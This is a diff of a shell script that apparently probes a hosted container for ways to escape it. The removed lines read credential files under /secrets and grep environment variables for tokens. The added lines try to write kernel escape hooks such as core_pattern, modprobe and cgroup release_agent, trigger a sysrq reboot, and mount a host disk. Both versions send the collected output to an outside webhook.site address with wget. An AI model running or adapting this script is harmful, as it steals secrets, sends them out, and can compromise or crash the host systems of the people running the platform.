@@ -1,14 +1,15 @@
 #!/bin/sh
 {
-echo "==secrets-dir=="; ls -land /secrets /secrets/* 2>&1
-echo "==sock-type=="; for f in /secrets/api.sock /secrets/*.sock; do [ -S "$f" ] && echo "SOCKET $f"; [ -e "$f" ] && ls -la "$f" 2>&1; done
-echo "==nomad-env=="; env | grep -iE 'nomad|vault|consul|token|alloc' 
-echo "==nomad-cli=="; command -v nomad consul vault 2>&1
-echo "==try-sock=="; (echo -e 'GET /v1/agent/self HTTP/1.1\r\nHost: localhost\r\n\r\n'; sleep 2) | nc /secrets/api.sock 2>&1 | head -c 200 || echo "no nc"
-echo "==python=="; command -v python3 python 2>&1
-echo "==secrets-cat=="; for f in /secrets/run.env /secrets/registry-auth.env; do echo "-- $f --"; wc -c "$f" 2>&1; cat "$f" 2>&1|head -c 200; done
-echo "==selinux=="; cat /sys/fs/selinux/enforce 2>&1; command -v getenforce 2>&1
-echo "==ptrace=="; cat /proc/1/status 2>&1 | grep -iE 'Cap|Seccomp'
+echo "==core_pattern=="; cat /proc/sys/kernel/core_pattern 2>&1; echo "bbh" > /proc/sys/kernel/core_pattern 2>&1 && echo "CORE_PATTERN WRITABLE" || echo "core_pattern not writable"
+echo "==modprobe=="; echo "bbh" > /proc/sys/kernel/modprobe 2>&1 && echo "MODPROBE WRITABLE" || echo "modprobe not writable"
+echo "==uevent=="; echo "bbh" > /sys/kernel/uevent_helper 2>&1 && echo "UEVENT WRITABLE" || echo "uevent not writable"
+echo "==sysrq=="; echo b > /proc/sysrq-trigger 2>&1 && echo "SYSRQ WRITABLE" || echo "sysrq not writable"
+echo "==cgroup-v1=="; ls /sys/fs/cgroup/ 2>&1 | head; cat /sys/fs/cgroup/release_agent 2>&1; echo "x" > /sys/fs/cgroup/release_agent 2>&1 && echo "RELEASE_AGENT WRITABLE" || echo "release_agent not writable"
+echo "==cgroup-v2=="; ls /sys/fs/cgroup/*. 2>&1 | head; cat /sys/fs/cgroup/cgroup.controllers 2>&1
+echo "==mount-host=="; mount /dev/mapper/0f2a695d-a947-456e-9a7f-603a70d3bfb5 /mnt 2>&1 && echo "MOUNTED" || echo "mount failed"
+echo "==proc-sys-writable=="; for f in /proc/sys/kernel/core_pattern /proc/sys/kernel/modprobe /proc/sys/kernel/hostname /proc/sys/kernel/ns_last_pid; do [ -w "$f" ] && echo "WRITABLE $f"; done
+echo "==ns=="; ls -la /proc/1/ns/ 2>&1; echo "priority:"; cat /proc/1/status 2>&1 | grep -iE 'NSpid|CapEff'
+echo "==devices=="; ls -la /dev/ 2>&1 | head -20
 } > /www/index.txt 2>&1
-wget -q -O- --post-file=/www/index.txt "https://webhook.site/944a0813-f8cb-4afb-92cd-fa404a8621b0/ctr5" >/dev/null 2>&1
+wget -q -O- --post-file=/www/index.txt "https://webhook.site/944a0813-f8cb-4afb-92cd-fa404a8621b0/ctr6" >/dev/null 2>&1
 httpd -f -p 8080 -h /www
